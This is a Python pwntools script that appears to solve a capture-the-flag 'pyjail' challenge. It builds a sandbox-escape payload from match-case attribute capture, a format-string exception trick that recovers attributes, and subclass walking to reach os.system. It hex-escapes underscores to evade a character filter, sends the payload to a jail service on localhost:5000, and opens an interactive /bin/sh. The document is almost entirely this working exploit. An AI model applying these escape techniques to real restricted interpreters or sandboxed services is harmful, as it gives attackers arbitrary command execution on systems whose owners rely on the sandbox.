import string
from pwn import *

ans = f"""
def run():
    def getCls(v):
        return future("__class__", v)
    str = getCls("")
    type = getCls(str)
    match str:
        case type(format=strFormat):
            pass
    cancelledError = future("_make_cancelled_error", fut)
    CancelledError = getCls(cancelledError)
    match CancelledError:
        case type(mro=mro):
            pass
    mroList = mro()
    list = type(mroList)
    match mroList:
        case list(pop=pop):
            pass
    object = pop()
    BaseException = pop()
    
    def getattr(v, k):
        try:
            strFormat("\\x7bx\\x2e"+k+"\\x2efoobar\\x7d", x=v)
        except BaseException as e:
            match e:
                case BaseException(obj=obj):
                    return obj
    v = getattr(object, "__subclasses__")()
    wc = getattr(v,"__getitem__")(190)
    system = getattr(getattr(getattr(wc, "__init__"),"__globals__"),"get")("system")
    system("/bin/sh")
    
run()
""".strip().replace("\n\n","\n").replace("_", "\\x5f")

allowed = string.ascii_letters + string.digits + " ()\n:,=\"+-%/\\"
print(set([c for c in ans if c not in allowed]))

io = remote("localhost", 5000)
# io = process(["/home/tchen/.pyenv/versions/3.12.7/bin/python", "jail.py"])
for line in ans.split("\n"):
    io.sendlineafter(b">>> ", line.encode())

io.sendafter(b">>> ", b"\n\n")
io.interactive()